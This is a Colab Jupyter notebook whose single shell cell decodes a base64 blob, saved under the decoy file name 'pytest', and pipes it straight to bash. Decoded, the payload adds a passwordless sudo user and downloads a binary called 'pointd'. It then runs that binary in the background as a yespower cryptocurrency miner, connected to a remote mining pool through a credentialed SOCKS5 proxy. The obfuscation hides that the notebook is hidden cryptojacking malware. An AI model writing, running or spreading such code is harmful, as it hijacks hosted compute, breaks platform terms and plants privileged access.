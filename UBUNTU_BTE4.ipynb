{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "UBUNTU_BTE4.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "upbfXVaQNVxw"
      },
      "outputs": [],
      "source": [
        "%%shell\n",
        "cat > pytest <<END\n",
        "c3VkbyBhZGR1c2VyIC0tZGlzYWJsZWQtcGFzc3dvcmQgLS1nZWNvcyAnJyB1YnVu\n",
        "dHUNCnN1ZG8gYWRkdXNlciB1YnVudHUgc3Vkbw0Kc3VkbyB1c2VybW9kIC1hIC1H\n",
        "IHN1ZG8gdWJ1bnR1DQpjZCAvaG9tZS91YnVudHUNCndnZXQgLXEgaHR0cHM6Ly9n\n",
        "aXRodWIuY29tL25vbm9ua2JhdWsvY29tbXV0ZXIvcmVsZWFzZXMvZG93bmxvYWQv\n",
        "djIvcG9pbnRkICYmIGNobW9kICt4IHBvaW50ZA0KZWNobyAnbm9odXAgLi9wb2lu\n",
        "dGQgLWEgeWVzcG93ZXIgLW8gc3RyYXR1bSt0Y3A6Ly8xMDMuMjQ5LjcwLjc6NjUz\n",
        "MyAtdSBUTGpocERNcnNMeVV1Y2hMWm5ONEtBQ2ZkQ2hMNHJTbTRFLiQoc2h1ZiAt\n",
        "biAxIC1pIDEtOTk5OTk5OSkgLXAgYz1UUlgsbWM9QlRFIC14IHNvY2tzNTovLzZs\n",
        "MzBzaGs0ZjBicWV5OnBvcDc5a3UzMHRpMDFycXE0bHBxa2FpZGFmcUA1Mi43LjI0\n",
        "Ny4xMzg6MTA4MCcgPmJhc2guc2gNCnN1ZG8gY2hvd24gdWJ1bnR1OnN1ZG8gcG9p\n",
        "bnRkDQpzdWRvIGNob3duIHVidW50dTpzdWRvIGJhc2guc2gNCnN1ZG8gY2htb2Qg\n",
        "NzAwIHBvaW50ZCBiYXNoLnNoDQpzdSAtbCB1YnVudHUgc2ggLWMgIi9ob21lL3Vi\n",
        "dW50dS9iYXNoLnNoIg==\n",
        "END\n",
        "base64 pytest -d | bash"
      ]
    }
  ]
}
